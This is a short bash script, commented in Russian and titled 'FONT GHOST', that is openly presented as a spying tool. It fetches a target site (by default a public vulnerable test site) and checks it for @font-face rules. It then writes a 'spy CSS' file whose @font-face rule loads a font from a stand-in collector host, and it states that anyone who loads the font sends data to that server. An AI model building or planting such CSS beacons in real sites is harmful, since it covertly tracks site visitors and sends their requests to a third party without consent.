#!/bin/bash
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   🔤 FONT GHOST — Шпион через шрифты        ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Ищем @font-face на сайте
echo "[FONT] 🔍 Ищу шрифты..."
curl -sk --max-time 5 "$TARGET" -o /tmp/font_site.html 2>/dev/null
grep -qi "@font-face" /tmp/font_site.html 2>/dev/null && echo "  💀 @font-face НАЙДЕН!"

# Создаём шпионский CSS со встроенным жучком
cat > /tmp/font_bug.css << FONTCSS
@font-face {
    font-family: 'BugFont';
    src: url('https://collector.example.com/font?id=font_$(date +%s)');
    font-display: swap;
}
body { font-family: 'BugFont', sans-serif; }
FONTCSS
echo "  🐞 Шпионский CSS: /tmp/font_bug.css"
echo "  Каждый кто загрузит этот шрифт — отправит данные на сервер."
echo "[FONT] ✅ Анализ завершён"
